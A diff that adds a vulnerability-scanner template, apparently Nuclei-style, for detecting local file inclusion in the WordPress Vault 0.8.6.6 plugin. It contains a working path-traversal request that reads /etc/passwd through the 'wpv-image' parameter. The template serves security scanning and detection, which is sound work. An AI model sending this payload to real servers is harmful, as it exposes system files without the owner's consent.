@@ -1,0 +1,21 @@
+id: wp-vault-local-file-inclusion
+brief:
+    title: WordPress Vault 0.8.6.6 - Local File Inclusion
+    by: 0x_Akoko
+    level: high
+    about: WordPress Vault 0.8.6.6 is vulnerable to local file inclusion.
+    label:
+        - lfi
+        - edb
+        - wp-plugin
+        - wordpress
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd'
+      signs:
+        - "on": status
+          status:
+            - 200
